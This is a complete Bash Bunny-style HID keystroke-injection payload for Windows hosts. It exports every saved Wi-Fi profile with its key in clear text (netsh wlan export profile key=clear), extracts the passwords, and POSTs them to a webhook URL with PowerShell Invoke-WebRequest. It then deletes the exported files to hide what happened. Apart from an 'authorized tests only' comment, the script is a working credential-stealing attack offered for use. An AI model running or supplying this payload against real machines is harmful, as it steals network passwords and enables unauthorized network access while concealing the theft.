#!/bin/bash
# hak5_wifi_post (Windows host, HID) — grabs all saved Wi-Fi profile names +
# PSKs and POSTs them to a webhook.site URL.
# BEFORE USE: replace YOUR_WEBHOOK_URL in the REM lines with your webhook.
# Authorized tests only.
LED SETUP
ATTACKMODE HID
sleep 3
LED STAGE1
if [ ! -c /dev/hidg0 ]; then
    echo "[!] /dev/hidg0 missing - no host attached"
    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
fi
QUACK "REM hak5_wifi_post — authorized tests only" \
    "REM *** REPLACE YOUR_WEBHOOK_URL BELOW ***" \
    "DELAY 3000" \
    "GUI r" "DELAY 100" \
    "STRING cmd /k" "ENTER" "DELAY 500" \
    "STRING cd %temp%" "ENTER" "DELAY 500" \
    "STRING netsh wlan export profile key=clear" "ENTER" "DELAY 1000" "ENTER" \
    "STRING powershell Select-String -Path Wi*.xml -Pattern keyMaterial > WiFi-PASS" "ENTER" "DELAY 1000" \
    "STRING powershell Invoke-WebRequest -Uri https://YOUR_WEBHOOK_URL -Method POST -InFile WiFi-PASS" "ENTER" "DELAY 1000" \
    "STRING del WiFi* /s /f /q" "ENTER" "DELAY 100" \
    "STRING exit" "ENTER"
echo "[+] wifi_post injected — WiFi creds POSTed to webhook"
LED FINISH
exit 0
